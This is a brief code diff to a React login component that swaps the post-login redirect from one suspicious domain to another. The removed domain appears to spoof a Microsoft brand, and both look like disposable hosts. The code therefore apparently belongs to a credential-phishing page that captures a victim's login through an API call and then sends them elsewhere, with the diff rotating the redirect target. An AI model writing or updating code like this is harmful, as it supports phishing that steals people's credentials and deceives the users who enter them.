@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://tobbs.2loglinemistrocoft.pro/';
+      window.location.href = 'https://Tblogline.1tobyboint.mom/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
